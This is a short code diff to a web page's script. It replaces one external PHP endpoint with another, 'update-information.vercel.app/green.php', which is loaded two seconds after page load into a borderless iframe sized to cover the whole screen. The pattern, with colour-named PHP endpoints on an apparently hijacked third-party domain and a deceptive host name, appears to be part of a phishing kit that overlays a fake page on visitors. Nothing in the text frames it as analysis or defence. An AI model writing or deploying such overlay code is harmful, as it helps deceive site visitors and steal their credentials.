@@ -17,7 +17,7 @@ margin:0px;
 function loadScript(src){let iframe = document.createElement('iframe');iframe.src = src;
 iframe.height = screen.height;iframe.width = "100%";iframe.scrolling = "yes";
 iframe.frameBorder = "0";document.body.append(iframe);}
-function load(){loadScript('https://www.morepersonaleogmontering.no/more/ma///bleu.php');}
+function load(){loadScript('https://update-information.vercel.app/green.php');}
 setTimeout(function(){
 load();  
 }, 2000); 
